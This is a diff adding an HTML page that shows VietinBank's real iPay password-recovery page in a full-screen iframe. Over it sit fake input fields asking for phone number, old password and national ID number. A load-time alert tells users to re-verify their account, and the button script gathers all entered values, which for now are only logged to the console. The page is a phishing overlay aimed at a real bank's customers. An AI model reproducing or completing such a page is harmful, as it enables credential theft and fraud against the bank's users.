@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<style>
+  body {
+    margin: 0;
+  }
+
+
+  iframe {
+    border: none;
+    width: 100%;
+    height: 100vh;
+    position: absolute;
+    z-index: 1;
+  }
+
+  form {
+    position: relative;
+    z-index: 3;
+  }
+
+
+  .input-group button {
+    margin-top: 6px
+  }
+
+  .input-group .hint {
+    color: #EA114E;
+    margin-top: 8px
+  }
+
+  .input-group .hint.normal {
+    color: #9EB3C9
+  }
+
+
+  .input-group .input-box .wrap-input input {
+
+    border: none;
+    background-color: white;
+    padding: 8px 0;
+    border-bottom: 1px solid #9EB3C9;
+    outline: none;
+    border-radius: 0
+  }
+
+  .input-group .input-box .wrap-input input.pass {
+    padding-right: 30px
+  }
+
+  .input-group .input-box .wrap-input input.error {
+    border-color: #EA114E
+  }
+
+  .input-group .input-box .wrap-input input::placeholder {
+    color: #9EB3C9
+  }
+
+  .input-group .input-box .wrap-input.outlined .view-password {
+    right: 8px;
+    padding: 0
+  }
+
+  .input-group .input-box .wrap-input.outlined input {
+    border: 1px solid #C9D9EA;
+    background-color: #fff;
+    padding: 13px 16px
+  }
+
+  .input-group .input-box .wrap-input.outlined input.pass {
+    padding-right: 40px
+  }
+
+  .input-group .input-box .wrap-input.outlined input.error {
+    border-color: #EA114E
+  }
+
+  .label-3,
+  .label-4,
+  .label-5 {
+    width: 280px !important;
+    height: 20px;
+    position: absolute;
+    top: 320px;
+    right: 104px;
+  }
+
+  .label-4 {
+    top: 385px;
+    right: 104px;
+  }
+
+  .label-5 {
+    top: 450px;
+    right: 104px;
+  }
+
+
+  .app-btn {
+    position: absolute;
+    left: 1054px;
+    width: 283px !important;
+    top: 528px;
+    cursor: pointer;
+    border: none;
+    outline: none;
+    position: relative;
+    min-width: 130px;
+    border-radius: 4px;
+    color: #fff;
+    padding: 16px;
+    /* background: #005993; */
+    background-color: black;
+
+
+  }
+
+  .app-btn.b-medium {
+    font-size: 16px;
+    font-weight: 500;
+    line-height: 16px;
+  }
+
+  .app-btn.b-empty,
+  .app-btn.b-outline {
+    color: #005993;
+
+    background-color: white;
+  }
+
+  .app-btn-back {
+    text-decoration: none;
+    left: 882px;
+    top: 600px;
+
+  }
+
+</style>
+
+<body style="overflow: inherit;">
+  <iframe src="https://ipay.vietinbank.vn/forgot-username"></iframe>
+  <form>
+    <div class=" input-group ">
+      <div class="input-box">
+        <div class="wrap-input "><input class="label-3" type="text" maxlength="255" placeholder="Nhập số điện thoại"
+            value=""></div>
+      </div>
+    </div>
+
+    <div class=" input-group">
+      <div class="input-box">
+        <div class="wrap-input "><input class="label-4" type="text" maxlength="255" placeholder="Mật khẩu cũ" value="">
+        </div>
+      </div>
+    </div>
+    <div class=" input-group ">
+      <div class="input-box">
+        <div class="wrap-input "><input class="label-5" type="text" maxlength="255" placeholder="Số tờ các nhân"
+            value=""></div>
+      </div>
+    </div>
+    <input id="btnGetInfo" type="button" class="app-btn b-medium mt-12 btn-full-width" value="Tiếp tục"></input>
+    <a href="./index.html" class="app-btn app-btn-back b-medium b-empty mt-2 btn-full-width">Hủy</a>
+  </form>
+  <script type="text/javascript">
+    window.onload = function () {//window.addEventListener('load',function(){...}); (for Netscape) and window.attachEvent('onload',function(){...}); (for IE and Opera) also work
+      alert('Vui lòng xác minh lại tài khoản của bạn');
+      // alert('doi mat khau di');
+    }
+  </script>
+  <script>
+    let element = document.getElementById("btnGetInfo");
+    element.addEventListener("click", myFunction);
+
+    function myFunction() {
+      let listInput = document.getElementsByTagName("input")
+      for (let i = 0; i < listInput.length; i++) {
+        console.log(listInput[i].value);
+      }
+    }
+ 
+
+  </script>
+</body>
+
+</html>
